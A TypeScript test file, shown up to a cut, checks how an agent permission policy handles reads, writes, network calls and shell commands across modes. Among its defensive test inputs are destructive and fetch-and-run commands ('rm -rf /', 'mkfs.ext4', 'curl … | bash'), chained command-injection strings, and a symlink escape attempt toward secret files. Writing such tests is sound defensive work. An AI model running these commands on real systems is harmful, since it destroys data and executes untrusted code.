import * as os from 'os';
import * as path from 'path';
import { mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises';
import { describe, expect, it, vi, beforeEach } from 'vitest';
import type { AgentPermissionMode } from '@shared/types/settings';
import type { AgentTool } from '../agent/AgentTool';
import type { ToolCall } from '../core/types';
import { AgentPermissionPolicyService } from './AgentPermissionPolicy';
import { isWithinRootAllowingAliases } from '../tools/primitives/_shared';
import { compilePolicyFromRestrictive } from './PolicyCompiler';
import { freezeRdcTurnBinding } from '../../tools/RdcTurnBindings';
import { DEFAULT_RDC_CLI_INVOKER } from '../../settings/settingsDefaults';
import type { RdcOperationDefinition } from '@shared/types/tool';
const ownership = vi.hoisted(() => ({ lease: vi.fn() }));
vi.mock('../../sessions/RdcRuntimeContextRegistry', () => ({ assertRdcContextLeaseOwnership: ownership.lease, getRdcContextLease: () => null }));

const { mockSettings } = vi.hoisted(() => ({
  mockSettings: {
    paths: { userRdcRoot: 'D:\\AppWorkspace' },
    agentRuntime: {
      permissions: {
        mode: 'full-access' as AgentPermissionMode,
        readableRoots: [] as string[],
        writableRoots: [] as string[],
        allowedCommandPrefixes: [] as string[],
        deniedCommandPrefixes: [] as string[],
      },
    },
  },
}));

const fixtureRoot = path.join(os.tmpdir(), 'rdc-agent-permission-tests');
const workspaceRoot = path.join(fixtureRoot, 'workspace');
const externalRoot = path.join(fixtureRoot, 'external');
const readableRoot = path.join(fixtureRoot, 'shared');

vi.mock('../../settings/SettingsService', () => ({
  settingsService: {
    getAll: () => mockSettings,
  },
}));

vi.mock('../../runtime/resolveConfiguredShell', () => ({
  resolveConfiguredShell: () => ({
    executable: process.platform === 'win32' ? 'pwsh' : '/bin/bash',
    kind: process.platform === 'win32' ? 'pwsh' : 'bash',
    version: 'test',
  }),
}));

const readFileTool: AgentTool = {
  name: 'read_file',
  description: 'read file',
  parameters: { type: 'object', properties: {} },
  permissionHint: 'readonly',
  execute: async () => ({ content: [{ type: 'text', text: 'ok' }] }),
};

const webSearchTool: AgentTool = {
  name: 'web_search',
  description: 'search web',
  parameters: { type: 'object', properties: {} },
  permissionHint: 'readonly',
  spec: { isReadOnly: true, isConcurrencySafe: true, isDestructive: false, sideEffect: 'network', category: 'web', requiresApproval: false },
  execute: async () => ({ content: [{ type: 'text', text: 'ok' }] }),
};

const shellTool: AgentTool = {
  name: 'shell',
  description: 'shell',
  parameters: { type: 'object', properties: {} },
  permissionHint: 'mutation',
  spec: { isReadOnly: false, isConcurrencySafe: false, isDestructive: true, sideEffect: 'process', category: 'system', requiresApproval: true },
  execute: async () => ({ content: [{ type: 'text', text: 'ok' }] }),
};

const deleteFileTool: AgentTool = {
  name: 'delete_file',
  description: 'delete',
  parameters: { type: 'object', properties: {} },
  permissionHint: 'destructive',
  execute: async () => ({ content: [{ type: 'text', text: 'ok' }] }),
};

function makeReadFileToolCall(path: string): ToolCall {
  return {
    type: 'toolCall',
    id: 'tc-1',
    name: 'read_file',
    arguments: { path },
  };
}

function makeWebSearchToolCall(query: string): ToolCall {
  return {
    type: 'toolCall',
    id: 'tc-web',
    name: 'web_search',
    arguments: { query },
  };
}

describe('AgentPermissionPolicyService external reads', () => {
  const service = new AgentPermissionPolicyService();

  beforeEach(() => {
    mockSettings.agentRuntime.permissions.mode = 'full-access';
    mockSettings.agentRuntime.permissions.readableRoots = [];
    mockSettings.agentRuntime.permissions.writableRoots = [];
    mockSettings.agentRuntime.permissions.allowedCommandPrefixes = [];
    mockSettings.agentRuntime.permissions.deniedCommandPrefixes = [];
  });

  it('requires independent read authorization for the second audit file', () => {
    mockSettings.agentRuntime.permissions.mode = 'default';
    const call = makeReadFileToolCall(path.join(workspaceRoot, 'a.bin'));
    call.arguments.mode = 'audit';
    call.arguments.compareWith = { path: path.join(externalRoot, 'b.bin'), expectedHash: 'a'.repeat(64) };
    const decision = service.evaluate({ tool: readFileTool, toolCall: call, projectRootPath: workspaceRoot });
    expect(decision.action).not.toBe('allow');
    expect(decision.temporaryPathRoots).toContain(path.join(externalRoot, 'b.bin'));
  });

  it('uses configured readable roots for an audit comparison without granting their siblings', () => {
    mockSettings.agentRuntime.permissions.mode = 'custom';
    mockSettings.agentRuntime.permissions.readableRoots = [readableRoot];
    const call = makeReadFileToolCall(path.join(workspaceRoot, 'a.bin'));
    call.arguments.mode = 'audit';
    call.arguments.compareWith = { path: path.join(readableRoot, 'b.bin'), expectedHash: 'a'.repeat(64) };
    expect(service.evaluate({ tool: readFileTool, toolCall: call, projectRootPath: workspaceRoot }).action).toBe('allow');
    call.arguments.compareWith = { path: path.join(externalRoot, 'b.bin'), expectedHash: 'a'.repeat(64) };
    expect(service.evaluate({ tool: readFileTool, toolCall: call, projectRootPath: workspaceRoot }).action).not.toBe('allow');
  });

  it('allows full-access reads outside the project root without asking', () => {
    const decision = service.evaluate({
      tool: readFileTool,
      toolCall: makeReadFileToolCall(path.join(externalRoot, 'src', 'main.ts')),
      projectRootPath: workspaceRoot,
    });

    expect(decision.action).toBe('allow');
    expect(decision.temporaryPathRoots).toEqual(['*']);
  });

  it('requests approval for default-mode external reads', () => {
    mockSettings.agentRuntime.permissions.mode = 'default';

    const decision = service.evaluate({
      tool: readFileTool,
      toolCall: makeReadFileToolCall(path.join(externalRoot, 'src', 'main.ts')),
      projectRootPath: workspaceRoot,
    });

    expect(decision.action).toBe('ask_user');
    expect(decision.reason).toContain('Read access is outside the workspace');
  });

  it('auto-reviews external reads in auto-review mode', () => {
    mockSettings.agentRuntime.permissions.mode = 'auto-review';

    const decision = service.evaluate({
      tool: readFileTool,
      toolCall: makeReadFileToolCall(path.join(externalRoot, 'src', 'main.ts')),
      projectRootPath: workspaceRoot,
    });

    expect(decision.action).toBe('auto_review');
    expect(decision.risk).toBe('medium');
  });

  it('allows custom-mode reads inside configured readableRoots', () => {
    mockSettings.agentRuntime.permissions.mode = 'custom';
    mockSettings.agentRuntime.permissions.readableRoots = [readableRoot];

    const decision = service.evaluate({
      tool: readFileTool,
      toolCall: makeReadFileToolCall(path.join(readableRoot, 'notes.txt')),
      projectRootPath: workspaceRoot,
    });

    expect(decision.action).toBe('allow');
    expect(decision.temporaryPathRoots).toContain(path.join(readableRoot, 'notes.txt'));
  });

  it('allows default-mode reads inside the current session attachments directory', () => {
    mockSettings.agentRuntime.permissions.mode = 'default';
    const attachmentsRoot = path.join(fixtureRoot, 'session-a', 'attachments');
    const decision = service.evaluate({
      tool: readFileTool,
      toolCall: makeReadFileToolCall(path.join(attachmentsRoot, 'notes.txt')),
      projectRootPath: workspaceRoot,
      sessionAttachmentsRoot: attachmentsRoot,
    });
    expect(decision.action).toBe('allow');
    expect(decision.temporaryPathRoots).toContain(path.join(attachmentsRoot, 'notes.txt'));
  });

  it('does not grant write tools the session attachments root', () => {
    mockSettings.agentRuntime.permissions.mode = 'default';
    const attachmentsRoot = path.join(fixtureRoot, 'session-a', 'attachments');
    const decision = service.evaluate({
      tool: deleteFileTool,
      toolCall: {
        type: 'toolCall',
        id: 'tc-del',
        name: 'delete_file',
        arguments: { path: path.join(attachmentsRoot, 'notes.txt') },
      },
      projectRootPath: workspaceRoot,
      sessionAttachmentsRoot: attachmentsRoot,
    });
    expect(decision.action).toBe('ask_user');
  });

  it('does not allow reads from another session attachments directory', () => {
    mockSettings.agentRuntime.permissions.mode = 'default';
    const ownRoot = path.join(fixtureRoot, 'session-a', 'attachments');
    const otherRoot = path.join(fixtureRoot, 'session-b', 'attachments');
    const decision = service.evaluate({
      tool: readFileTool,
      toolCall: makeReadFileToolCall(path.join(otherRoot, 'notes.txt')),
      projectRootPath: workspaceRoot,
      sessionAttachmentsRoot: ownRoot,
    });
    expect(decision.action).toBe('ask_user');
  });
});

describe('structured RDC semantic risk', () => {
  const service = new AgentPermissionPolicyService();
  const evaluate = (arguments_: Record<string, unknown>, mode: AgentPermissionMode = 'auto-review', floor = false) => service.evaluate({
    agentId: 'general', tool: shellTool, toolCall: { id: 'rdc-query', type: 'toolCall', name: 'shell', arguments: arguments_ },
    projectRootPath: workspaceRoot, permissionSettings: { mode, readableRoots: [], writableRoots: [], allowedCommandPrefixes: [], deniedCommandPrefixes: [] },
    compiledPolicy: compilePolicyFromRestrictive(floor ? { approvalFloorByTool: { shell: 'user' } } : {}),
  });
  it.each([{ kind: 'search', query: 'export.texture get_details', limit: 8 }, { kind: 'describe', operation: 'rd.texture.get_details' }, { kind: 'list' }])('reviews a valid frozen catalog query as low risk: %j', discovery => {
    expect(evaluate({ rdc: { discovery } })).toMatchObject({ action: 'auto_review', risk: 'low' });
    expect(evaluate({ rdc: { discovery } }, 'auto-review', true).action).toBe('ask_user');
  });
  it('keeps native shader replacement under high-risk review', () => {
    expect(evaluate({ rdc: { operation: 'rd.shader.edit_and_replace', args: {} } })).toMatchObject({ action: 'auto_review', risk: 'high' });
  });
  it.each([
    { rdc: { discovery: { kind: 'search', query: '' } } },
    { rdc: { discovery: { kind: 'unknown' } } },
    { rdc: { discovery: { kind: 'list', limit: 21 } } },
    { rdc: { discovery: { kind: 'list' }, operation: 'rd.buffer.write', args: {} } },
    { command: 'echo hidden', rdc: { discovery: { kind: 'list' } } },
  ])('rejects malformed and mixed requests even in full access: %j', args => {
    expect(evaluate(args).action).toBe('deny');
    expect(evaluate(args, 'full-access').action).toBe('deny');
  });
});

describe('AgentPermissionPolicyService network tools', () => {
  const service = new AgentPermissionPolicyService();

  beforeEach(() => {
    mockSettings.agentRuntime.permissions.mode = 'full-access';
    mockSettings.agentRuntime.permissions.readableRoots = [];
    mockSettings.agentRuntime.permissions.writableRoots = [];
    mockSettings.agentRuntime.permissions.allowedCommandPrefixes = [];
    mockSettings.agentRuntime.permissions.deniedCommandPrefixes = [];
  });

  it('allows network tools in full-access mode', () => {
    const decision = service.evaluate({
      tool: webSearchTool,
      toolCall: makeWebSearchToolCall('RenderDoc'),
      projectRootPath: 'D:\\Projects\\Demo',
    });

    expect(decision.action).toBe('allow');
  });

  it('requests approval for network tools in default mode', () => {
    mockSettings.agentRuntime.permissions.mode = 'default';

    const decision = service.evaluate({
      tool: webSearchTool,
      toolCall: makeWebSearchToolCall('RenderDoc'),
      projectRootPath: 'D:\\Projects\\Demo',
    });

    expect(decision.action).toBe('ask_user');
    expect(decision.reason).toContain('Network tool "web_search" requires approval');
    expect(decision.risk).toBe('medium');
  });

  it('auto-reviews network tools in auto-review mode', () => {
    mockSettings.agentRuntime.permissions.mode = 'auto-review';

    const decision = service.evaluate({
      tool: webSearchTool,
      toolCall: makeWebSearchToolCall('RenderDoc'),
      projectRootPath: 'D:\\Projects\\Demo',
    });

    expect(decision.action).toBe('auto_review');
    expect(decision.risk).toBe('medium');
  });

  it('allows network tools in custom mode after explicit policy selection', () => {
    mockSettings.agentRuntime.permissions.mode = 'custom';

    const decision = service.evaluate({
      tool: webSearchTool,
      toolCall: makeWebSearchToolCall('RenderDoc'),
      projectRootPath: 'D:\\Projects\\Demo',
    });

    expect(decision.action).toBe('allow');
  });
});

describe('AgentPermissionPolicyService hard deny and path extract', () => {
  const service = new AgentPermissionPolicyService();

  beforeEach(() => {
    mockSettings.agentRuntime.permissions.mode = 'full-access';
    mockSettings.agentRuntime.permissions.readableRoots = [];
    mockSettings.agentRuntime.permissions.writableRoots = [];
    mockSettings.agentRuntime.permissions.allowedCommandPrefixes = [];
    mockSettings.agentRuntime.permissions.deniedCommandPrefixes = [];
  });

  it('hard-denies catastrophic shell even in full-access', () => {
    const decision = service.evaluate({
      tool: shellTool,
      toolCall: {
        type: 'toolCall',
        id: 'tc-shell',
        name: 'shell',
        arguments: { command: 'rm -rf /' },
      },
      projectRootPath: workspaceRoot,
    });

    expect(decision.action).toBe('deny');
    expect(decision.reason).toMatch(/hard-denied|rm -rf \//i);
  });

  it('surfaces delete_file path targets in default-mode approval reasons', () => {
    mockSettings.agentRuntime.permissions.mode = 'default';
    const target = path.join(workspaceRoot, 'tmp.txt');

    const decision = service.evaluate({
      tool: deleteFileTool,
      toolCall: {
        type: 'toolCall',
        id: 'tc-del',
        name: 'delete_file',
        arguments: { path: target },
      },
      projectRootPath: workspaceRoot,
    });

    expect(decision.action).toBe('ask_user');
    expect(decision.reason).toContain('delete_file');
  });

  it('denies tools listed in compiledPolicy.deniedTools even in full-access', () => {
    const compiledPolicy = compilePolicyFromRestrictive({ deniedTools: ['shell'] });
    const decision = service.evaluate({
      tool: shellTool,
      toolCall: {
        type: 'toolCall',
        id: 'tc-shell',
        name: 'shell',
        arguments: { command: 'pwd' },
      },
      projectRootPath: workspaceRoot,
      compiledPolicy,
    });
    expect(decision.action).toBe('deny');
    expect(decision.reason).toMatch(/deniedTools/i);
  });

  it('enforces compiled approval floors even in full-access mode', () => {
    const compiledPolicy = compilePolicyFromRestrictive({
      approvalFloorByTool: { read_file: 'user' },
    });
    const decision = service.evaluate({
      tool: readFileTool,
      toolCall: makeReadFileToolCall(path.join(workspaceRoot, 'src', 'main.ts')),
      projectRootPath: workspaceRoot,
      compiledPolicy,
    });
    expect(decision.action).toBe('ask_user');
  });

  it('raises allow baseline to auto_review via floor without short-circuiting baseline', () => {
    const compiledPolicy = compilePolicyFromRestrictive({
      approvalFloorByTool: { read_file: 'auto_review' },
    });
    const decision = service.evaluate({
      tool: readFileTool,
      toolCall: makeReadFileToolCall(path.join(workspaceRoot, 'src', 'main.ts')),
      projectRootPath: workspaceRoot,
      compiledPolicy,
    });
    expect(decision.action).toBe('auto_review');
  });

  it('does not weaken deny when floor is lower', () => {
    const compiledPolicy = compilePolicyFromRestrictive({
        deniedTools: ['shell'],
      approvalFloorByTool: { shell: 'auto_review' },
    });
    const decision = service.evaluate({
      tool: shellTool,
      toolCall: {
        type: 'toolCall',
        id: 'tc-shell',
        name: 'shell',
        arguments: { command: 'echo hi' },
      },
      projectRootPath: workspaceRoot,
      compiledPolicy,
    });
    expect(decision.action).toBe('deny');
    expect(decision.reason).toMatch(/deniedTools|denied/i);
  });
});

describe('AgentPermissionPolicyService floor × mode lattice', () => {
  const service = new AgentPermissionPolicyService();
  const writeFileTool: AgentTool = {
    name: 'write_file',
    description: 'write file',
    parameters: { type: 'object', properties: {} },
    permissionHint: 'mutation',
    execute: async () => ({ content: [{ type: 'text', text: 'ok' }] }),
  };

  function evaluate(mode: AgentPermissionMode, floor: 'none' | 'auto_review' | 'user') {
    mockSettings.agentRuntime.permissions.mode = mode;
    mockSettings.agentRuntime.permissions.readableRoots = [];
    mockSettings.agentRuntime.permissions.writableRoots = [];
    mockSettings.agentRuntime.permissions.allowedCommandPrefixes = [];
    mockSettings.agentRuntime.permissions.deniedCommandPrefixes = [];
    const compiledPolicy = floor === 'none'
      ? compilePolicyFromRestrictive({})
      : compilePolicyFromRestrictive({ approvalFloorByTool: { write_file: floor } });
    return service.evaluate({
      tool: writeFileTool,
      toolCall: {
        type: 'toolCall',
        id: 'tc-write',
        name: 'write_file',
        arguments: { path: path.join(workspaceRoot, 'out.txt') },
      },
      projectRootPath: workspaceRoot,
      compiledPolicy,
    });
  }

  const modes: AgentPermissionMode[] = ['default', 'auto-review', 'full-access', 'custom'];
  const floors = ['none', 'auto_review', 'user'] as const;
  const expectedAction: Record<(typeof floors)[number], Record<AgentPermissionMode, 'allow' | 'auto_review' | 'ask_user'>> = {
    user: {
      default: 'ask_user',
      'auto-review': 'ask_user',
      'full-access': 'ask_user',
      custom: 'ask_user',
    },
    auto_review: {
      default: 'ask_user',
      'auto-review': 'auto_review',
      'full-access': 'auto_review',
      custom: 'ask_user',
    },
    none: {
      default: 'ask_user',
      'auto-review': 'auto_review',
      'full-access': 'allow',
      custom: 'ask_user',
    },
  };

  it.each(floors.flatMap((floor) => modes.map((mode) => [floor, mode, expectedAction[floor][mode]] as const)))(
    'write_file in workspace: floor=%s mode=%s => %s',
    (floor, mode, action) => {
      expect(evaluate(mode, floor).action).toBe(action);
    },
  );
});

describe('AgentPermissionPolicyService shell risk classifier', () => {
  const service = new AgentPermissionPolicyService();

  beforeEach(() => {
    mockSettings.agentRuntime.permissions.mode = 'default';
    mockSettings.agentRuntime.permissions.readableRoots = [];
    mockSettings.agentRuntime.permissions.writableRoots = [];
    mockSettings.agentRuntime.permissions.allowedCommandPrefixes = [];
    mockSettings.agentRuntime.permissions.deniedCommandPrefixes = [];
  });

  it('denies chained rm after echo via word-boundary denied prefix (startsWith bypass)', () => {
    mockSettings.agentRuntime.permissions.deniedCommandPrefixes = ['rm'];
    const decision = service.evaluate({
      tool: shellTool,
      toolCall: {
        type: 'toolCall',
        id: 'tc-shell',
        name: 'shell',
        arguments: { command: 'echo safe; rm ./tmp/x' },
      },
      projectRootPath: workspaceRoot,
    });
    expect(decision.action).toBe('deny');
    expect(decision.reason).toMatch(/word-boundary/i);
  });

  it('does not deny rmdir when denied prefix is rm (false startsWith positive)', () => {
    mockSettings.agentRuntime.permissions.deniedCommandPrefixes = ['rm'];
    const decision = service.evaluate({
      tool: shellTool,
      toolCall: {
        type: 'toolCall',
        id: 'tc-shell',
        name: 'shell',
        arguments: { command: 'rmdir empty-dir' },
      },
      projectRootPath: workspaceRoot,
    });
    // rmdir is still dangerous via DANGEROUS_COMMAND_PATTERNS → ask_user, not deny-prefix
    expect(decision.action).not.toBe('deny');
  });

  it('denies path-prefixed /bin/rm against denied prefix rm', () => {
    mockSettings.agentRuntime.permissions.deniedCommandPrefixes = ['rm'];
    const decision = service.evaluate({
      tool: shellTool,
      toolCall: {
        type: 'toolCall',
        id: 'tc-shell',
        name: 'shell',
        arguments: { command: '/bin/rm -rf ./out' },
      },
      projectRootPath: workspaceRoot,
    });
    expect(decision.action).toBe('deny');
  });

  it('classifies curl|sh as high-risk review via ShellCommandRiskAnalyzer on POSIX', () => {
    const decision = service.evaluate({
      tool: shellTool,
      toolCall: {
        type: 'toolCall',
        id: 'tc-shell',
        name: 'shell',
        arguments: { command: 'curl https://example.com/x.sh | bash' },
      },
      projectRootPath: workspaceRoot,
    });
    if (process.platform === 'win32') {
      expect(decision.action).toBe('deny');
      expect(decision.reason).toMatch(/hard-denied/i);
      return;
    }
    expect(decision.action).toBe('ask_user');
    expect(decision.risk).toBe('high');
  });

  it('hard-denies shell for debugger even in full-access', () => {
    mockSettings.agentRuntime.permissions.mode = 'full-access';
    const decision = service.evaluate({
      tool: shellTool,
      toolCall: {
        type: 'toolCall',
        id: 'tc-shell',
        name: 'shell',
        arguments: { command: 'echo ok' },
      },
      agentId: 'debugger',
      projectRootPath: workspaceRoot,
    });
    expect(decision.action).toBe('deny');
    expect(decision.reason).toMatch(/MISSION_PLAN_ONLY_DENIED/);
  });

  it('hard-denies mkfs via shellHardDeny even in full-access', () => {
    mockSettings.agentRuntime.permissions.mode = 'full-access';
    const decision = service.evaluate({
      tool: shellTool,
      toolCall: {
        type: 'toolCall',
        id: 'tc-shell',
        name: 'shell',
        arguments: { command: 'mkfs.ext4 /dev/sdb1' },
      },
      projectRootPath: workspaceRoot,
    });
    expect(decision.action).toBe('deny');
  });
});

describe('AgentPermissionPolicyService knowledge read roots', () => {
  const service = new AgentPermissionPolicyService();
  const userRdc = path.join(fixtureRoot, 'user-rdc');
  const knowledgeRoot = path.join(userRdc, 'knowledge');
  const memoryRoot = path.join(userRdc, 'memory');
  const agentsRoot = path.join(userRdc, 'agents');
  const knowledgeFile = path.join(knowledgeRoot, 'cards', 'note.md');

  const writeFileTool: AgentTool = {
    name: 'write_file',
    description: 'write',
    parameters: { type: 'object', properties: {} },
    permissionHint: 'mutation',
    execute: async () => ({ content: [{ type: 'text', text: 'ok' }] }),
  };
  const editFileTool: AgentTool = {
    name: 'edit_file',
    description: 'edit',
    parameters: { type: 'object', properties: {} },
    permissionHint: 'mutation',
    execute: async () => ({ content: [{ type: 'text', text: 'ok' }] }),
  };
  const codeInterpreterTool: AgentTool = {
    name: 'code_interpreter',
    description: 'interpreter',
    parameters: { type: 'object', properties: {} },
    permissionHint: 'mutation',
    execute: async () => ({ content: [{ type: 'text', text: 'ok' }] }),
  };

  function toolFor(name: string): AgentTool {
    if (name === 'write_file') return writeFileTool;
    if (name === 'edit_file') return editFileTool;
    if (name === 'delete_file') return deleteFileTool;
    if (name === 'shell') return shellTool;
    if (name === 'code_interpreter') return codeInterpreterTool;
    return {
      name,
      description: name,
      parameters: { type: 'object', properties: {} },
      permissionHint: 'readonly',
      execute: async () => ({ content: [{ type: 'text', text: 'ok' }] }),
    };
  }

  function makeCall(name: string, target: string): ToolCall {
    if (name === 'glob') {
      return { type: 'toolCall', id: 'tc-kn', name, arguments: { cwd: target, pattern: '**/*' } };
    }
    if (name === 'grep') {
      return { type: 'toolCall', id: 'tc-kn', name, arguments: { path: target, pattern: 'x' } };
    }
    if (name === 'shell') {
      return { type: 'toolCall', id: 'tc-kn', name, arguments: { command: `node ${target}` } };
    }
    if (name === 'code_interpreter') {
      return { type: 'toolCall', id: 'tc-kn', name, arguments: { cwd: target } };
    }
    return { type: 'toolCall', id: 'tc-kn', name, arguments: { path: target } };
  }

  beforeEach(() => {
    mockSettings.agentRuntime.permissions.mode = 'default';
    mockSettings.agentRuntime.permissions.readableRoots = [];
    mockSettings.agentRuntime.permissions.writableRoots = [];
    mockSettings.agentRuntime.permissions.allowedCommandPrefixes = [];
    mockSettings.agentRuntime.permissions.deniedCommandPrefixes = [];
  });

  it.each(['read_file', 'read_image', 'glob', 'grep'] as const)(
    'auto-allows %s inside frozen knowledgeReadRoots without approval',
    (name) => {
      const decision = service.evaluate({
        tool: toolFor(name),
        toolCall: makeCall(name, knowledgeFile),
        projectRootPath: workspaceRoot,
        knowledgeReadRoots: [knowledgeRoot],
      });
      expect(decision.action).toBe('allow');
      expect(decision.temporaryPathRoots.some((root) => (
        root === knowledgeFile || root === knowledgeRoot || root.startsWith(knowledgeRoot)
      ))).toBe(true);
    },
  );

  it('denies sibling ~/.rdc-agent/memory and ~/.rdc-agent/agents reads', () => {
    for (const sibling of [path.join(memoryRoot, 'x.md'), path.join(agentsRoot, 'ask.md')]) {
      const decision = service.evaluate({
        tool: readFileTool,
        toolCall: makeReadFileToolCall(sibling),
        projectRootPath: workspaceRoot,
        knowledgeReadRoots: [knowledgeRoot],
      });
      expect(decision.action).toBe('ask_user');
      expect(decision.reason).toContain('Read access is outside the workspace');
    }
  });

  it('does not treat knowledge roots as writable for mutation tools', () => {
    for (const name of ['write_file', 'edit_file', 'delete_file', 'shell', 'code_interpreter'] as const) {
      const decision = service.evaluate({
        tool: toolFor(name),
        toolCall: makeCall(name, knowledgeFile),
        projectRootPath: workspaceRoot,
        knowledgeReadRoots: [knowledgeRoot],
      });
      expect(decision.action).toBe('ask_user');
      expect(decision.temporaryPathRoots).not.toContain(knowledgeRoot);
    }
  });

  it('does not auto-allow read_file through a knowledge-root junction into memory/agents', async () => {
    const tmp = await mkdtemp(path.join(os.tmpdir(), 'rdc-kn-policy-junc-'));
    const knowledge = path.join(tmp, 'knowledge');
    const memory = path.join(tmp, 'memory');
    const agents = path.join(tmp, 'agents');
    await mkdir(knowledge, { recursive: true });
    await mkdir(memory, { recursive: true });
    await mkdir(agents, { recursive: true });
    await writeFile(path.join(memory, 'note.md'), 'secret', 'utf8');
    await writeFile(path.join(agents, 'ask.md'), 'secret', 'utf8');
    const memoryLink = path.join(knowledge, 'to-memory');
    const agentsLink = path.join(knowledge, 'to-agents');
    try {
      await symlink(memory, memoryLink, process.platform === 'win32' ? 'junction' : 'dir');
      await symlink(agents, agentsLink, process.platform === 'win32' ? 'junction' : 'dir');
    } catch {
      await rm(tmp, { recursive: true, force: true });
      return;
    }
    try {
      for (const escaped of [path.join(memoryLink, 'note.md'), path.join(agentsLink, 'ask.md')]) {
        expect(isWithinRootAllowingAliases(escaped, knowledge)).toBe(false);
        const decision = service.evaluate({
          tool: readFileTool,
          toolCall: makeReadFileToolCall(escaped),
          projectRootPath: workspaceRoot,
          knowledgeReadRoots: [knowledge],
        });
        expect(decision.action).not.toBe('allow');
      }
    } finally {
      await rm(tmp, { recursive: true, force: true });
    }
  });

  it('keeps Full access write semantics and does not add knowledge roots as writable grants', () => {
    mockSettings.agentRuntime.permissions.mode = 'full-access';
    const decision = service.evaluate({
      tool: writeFileTool,
      toolCall: makeCall('write_file', knowledgeFile),
      projectRootPath: workspaceRoot,
      knowledgeReadRoots: [knowledgeRoot],
    });
    expect(decision.action).toBe('allow');
    expect(decision.temporaryPathRoots).toEqual(['*']);
    expect(decision.temporaryPathRoots).not.toContain(knowledgeRoot);
  });
});


describe('file routing across permission modes', () => {
  it.each(['git status; git reset --hard', 'git status && git reset --hard', 'git status & git reset --hard',
    'git diff --output=result.txt', 'git status; echo $(danger)', 'git status | unknown-command'])('does not authorize an entire shell chain by its safe prefix: %s', command => {
    const decision = new AgentPermissionPolicyService().evaluate({ tool: shellTool,
      toolCall: { type: 'toolCall', id: 'compound', name: 'shell', arguments: { command } },
      permissionSettings: { mode: 'auto-review', readableRoots: [], writableRoots: [], allowedCommandPrefixes: ['git status', 'git diff'], deniedCommandPrefixes: [] } });
    expect(decision.action).not.toBe('allow');
    expect(decision.risk).not.toBe('low');
  });
  it.each(['pnpm run typecheck', 'node scripts/check-', 'pnpm run check:'])('reviews repository scripts whose effects cannot be derived from the command name: %s', command => {
    const decision = new AgentPermissionPolicyService().evaluate({ tool: shellTool,
      toolCall: { type: 'toolCall', id: 'repo-script', name: 'shell', arguments: { command } },
      permissionSettings: { mode: 'auto-review', readableRoots: [], writableRoots: [], allowedCommandPrefixes: [], deniedCommandPrefixes: [] } });
    expect(decision).toMatchObject({ action: 'auto_review', risk: 'medium' });
  });
  it('allows bounded workspace text edits but separates protected and read-only targets', () => {
    const service = new AgentPermissionPolicyService();
    const evaluate = (file: string) => service.evaluate({ tool: { ...deleteFileTool, name: 'write_file', permissionHint: 'mutation' },
      toolCall: { type: 'toolCall', id: 'write', name: 'write_file', arguments: { path: file, content: 'test' } }, projectRootPath: workspaceRoot,
      permissionSettings: { mode: 'auto-review', readableRoots: [], writableRoots: [], allowedCommandPrefixes: [], deniedCommandPrefixes: [] } });
    expect(evaluate('results/source.txt')).toMatchObject({ action: 'auto_review', risk: 'low' });
    expect(evaluate('.rdc-agent/skills/x/SKILL.md')).toMatchObject({ action: 'auto_review', risk: 'high' });
    for (const target of ['capture.rdc', '.rdc-agent/inputs/source.txt', '.rdc-agent/knowledge/cases/example.md', '.git/config']) expect(evaluate(target).action).toBe('deny');
  });
  it('uses verified catalog effects and ownership for native decisions without operation-name allowlists', () => {
    const service = new AgentPermissionPolicyService();
    const lease = { contextId: 'owned', version: 7, ownerProjectId: 'project', ownerSessionId: 'session',
      runtimeContext: { replaySessionId: 'replay', captureFileId: 'capture' } };
    ownership.lease.mockReturnValue(lease);
    const definition: RdcOperationDefinition = { name: 'rd.example.inspect', namespace: 'example', description: 'test',
      input_schema: { type: 'object', properties: { session_id: { type: 'string' },
        expected_revision: { type: 'string', description: 'Revision of the current object before applying the requested change.' } }, required: ['session_id'], additionalProperties: false },
      scope: 'replay', effects: [], evidence_kind: null, path_inputs: [], prerequisites: [{ requires: 'session_id' }] };
    const executionContext = { agentId: 'general', sessionId: 'session', projectId: 'project', turnId: 'turn', workspaceRoot, projectRootPath: workspaceRoot,
      rdcBinding: freezeRdcTurnBinding({ ...DEFAULT_RDC_CLI_INVOKER, enabled: true, command: 'native' }, [definition], lease) };
    const evaluate = (args = {}, mode: AgentPermissionMode = 'auto-review') => service.evaluate({ tool: shellTool, agentId: 'general', executionContext,
      toolCall: { type: 'toolCall', id: 'native', name: 'shell', arguments: { rdc: { operation: definition.name, args } } },
      permissionSettings: { mode, readableRoots: [], writableRoots: [], allowedCommandPrefixes: [], deniedCommandPrefixes: [] } });
    expect(evaluate()).toMatchObject({ action: 'auto_review', risk: 'low', operationFacts: { effects: [], arguments: { session_id: 'replay' } } });
    expect(evaluate({ expected_revision: 'before' }).operationFacts).toMatchObject({
      operationContract: { description: definition.description, inputSchema: definition.input_schema,
        pathInputs: definition.path_inputs, prerequisites: definition.prerequisites },
      arguments: { expected_revision: 'before', session_id: 'replay' },
    });
    expect(evaluate({ session_id: 'forged' }, 'full-access').action).toBe('deny');
    expect(evaluate({ unknown: true }).action).toBe('deny');
    const discovery = (kind: Record<string, unknown>) => service.evaluate({ tool: shellTool, agentId: 'general', executionContext,
      toolCall: { type: 'toolCall', id: 'discovery', name: 'shell', arguments: { rdc: { discovery: kind } } },
      permissionSettings: { mode: 'full-access', readableRoots: [], writableRoots: [], allowedCommandPrefixes: [], deniedCommandPrefixes: [] } });
    expect(discovery({ kind: 'describe', operation: definition.name }).action).toBe('allow');
    expect(discovery({ kind: 'describe', operation: 'rd.example.unknown' }).action).toBe('deny');
    expect(discovery({ kind: 'list', cursor: { offset: 0, fingerprint: '0'.repeat(64) } }).action).toBe('deny');
    const replacement = { ...definition, effects: ['shader_replacement'] };
    const rollback: RdcOperationDefinition = { ...replacement, name: 'rd.example.restore', evidence_kind: 'rollback' };
    const unknownWriter = { ...definition, name: 'rd.example.write', effects: ['unknown_data_write'] };
    executionContext.rdcBinding = freezeRdcTurnBinding(executionContext.rdcBinding.cli, [replacement, rollback, unknownWriter], lease);
    expect(evaluate()).toMatchObject({ action: 'auto_review', risk: 'medium', operationFacts: {
      catalogCapabilities: { coverage: 'complete-frozen-catalog', checkedOperations: 3,
        admittedOperations: 2, deniedOperations: 1, admittedEffects: ['shader_replacement'], isNativeStateObservation: false },
      rollbackContracts: [rollback],
    } });
    expect(discovery({ kind: 'describe', operation: unknownWriter.name }).action).toBe('allow');
    expect(service.evaluate({ tool: shellTool, agentId: 'general', executionContext,
      toolCall: { type: 'toolCall', id: 'unknown-write', name: 'shell', arguments: { rdc: { operation: unknownWriter.name, args: {} } } },
